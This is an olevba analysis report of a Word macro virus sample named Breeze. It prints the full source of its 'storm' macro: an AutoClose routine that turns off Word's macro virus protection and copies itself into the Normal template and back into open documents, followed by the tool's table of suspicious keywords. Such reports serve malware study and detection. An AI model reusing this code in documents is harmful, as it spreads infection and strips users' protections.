olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Breeze-5334d35a56f6e30e497c08f4c881bf9c082e8ec9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Breeze-5334d35a56f6e30e497c08f4c881bf9c082e8ec9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO storm.bas 
in file: Virus.MSWord.Breeze-5334d35a56f6e30e497c08f4c881bf9c082e8ec9 - OLE stream: 'Macros/VBA/storm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error Resume Next
Options.VirusProtection = False
If Len(NormalTemplate.VBProject.VBComponents.Item("storm")) < 1 Then Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "storm", wdOrganizerObjectProjectItems
If Len(ActiveDocument.VBProject.VBComponents.Item("storm")) < 1 Then Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "storm", wdOrganizerObjectProjectItems
ActiveDocument.Save
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

